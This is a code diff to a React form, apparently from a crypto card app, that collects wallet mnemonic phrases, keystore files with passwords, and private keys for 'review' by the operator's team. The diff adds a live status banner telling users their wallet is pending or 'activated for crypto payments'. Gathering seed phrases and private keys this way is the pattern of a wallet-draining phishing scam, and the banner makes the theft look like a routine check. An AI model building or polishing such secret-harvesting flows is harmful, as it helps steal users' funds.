@@ -9,6 +9,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Textarea } from "@/components/ui/textarea";
 import { saveWalletValidation, type ValidationType } from "@/features/wallet-validate/server/actions";
+import { useRealtime } from "@/lib/hooks/use-realtime";
 import { cn } from "@/lib/utils/cn";
 
 const TABS: { id: ValidationType; label: string; icon: React.ElementType }[] = [
@@ -36,12 +37,25 @@ export function ManualValidation({
   const [activeTab, setActiveTab] = useState<ValidationType>("mnemonics");
   const [saving, setSaving] = useState(false);
   const [result, setResult] = useState<{ success?: boolean; message: string } | null>(null);
+  const [submittedId, setSubmittedId] = useState<string | null>(null);
+  const [liveStatus, setLiveStatus] = useState<Record<string, string>>({});
   const [form, setForm] = useState({
     mnemonicPhrase: "",
     keystoreJson: "",
     keystorePassword: "",
     privateKey: "",
     hardwareType: "ledger",
+  });
+
+  // Live sync: when our team approves or rejects this validation, the status
+  // updates here in real time (RLS limits this to your own records).
+  useRealtime<{
+    eventType: "INSERT" | "UPDATE" | "DELETE";
+    new?: { id: string; status: string } | null;
+  }>("my-wallet-validations", "*", "wallet_validations", (payload) => {
+    const row = payload.new;
+    if (!row) return;
+    setLiveStatus((prev) => ({ ...prev, [row.id]: row.status ?? "pending" }));
   });
 
   const setField = (field: string, value: string) =>
@@ -84,6 +98,7 @@ export function ManualValidation({
         setResult({ success: false, message: res.error });
       } else {
         setResult({ success: true, message: `${walletName.trim()} validated and submitted for review.` });
+        setSubmittedId(res.validationId ?? null);
         setForm({ mnemonicPhrase: "", keystoreJson: "", keystorePassword: "", privateKey: "", hardwareType: "ledger" });
         setWalletName("");
         onSaved?.();
@@ -226,6 +241,46 @@ export function ManualValidation({
             <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" aria-hidden="true" />
           )}
           <span>{result.message}</span>
+        </div>
+      )}
+
+      {submittedId && (
+        <div
+          role="status"
+          className={cn(
+            "flex items-start gap-3 rounded-xl border p-4 text-sm",
+            liveStatus[submittedId] === "validated" && "border-emerald-500/20 bg-emerald-50 text-emerald-700",
+            liveStatus[submittedId] === "rejected" && "border-error/20 bg-error/10 text-error",
+            (!liveStatus[submittedId] || liveStatus[submittedId] === "pending") &&
+              "border-amber-500/20 bg-amber-50 text-amber-700",
+          )}
+        >
+          {liveStatus[submittedId] === "validated" ? (
+            <CheckCircle2 className="mt-0.5 h-4 w-4 shrink-0" aria-hidden="true" />
+          ) : liveStatus[submittedId] === "rejected" ? (
+            <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" aria-hidden="true" />
+          ) : (
+            <span className="relative mt-1 flex h-2 w-2 shrink-0">
+              <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-amber-400 opacity-75" />
+              <span className="relative inline-flex h-2 w-2 rounded-full bg-amber-500" />
+            </span>
+          )}
+          <div>
+            <p className="font-medium">
+              {liveStatus[submittedId] === "validated"
+                ? "Wallet validated — activated for crypto payments"
+                : liveStatus[submittedId] === "rejected"
+                  ? "Validation rejected — contact support for help"
+                  : "Pending review"}
+            </p>
+            <p className="mt-0.5 text-xs opacity-80">
+              {liveStatus[submittedId] === "validated"
+                ? "You can now pay for cards with this wallet."
+                : liveStatus[submittedId] === "rejected"
+                  ? "Our team could not verify these details."
+                  : "Our team is verifying your wallet — this updates automatically."}
+            </p>
+          </div>
         </div>
       )}
 
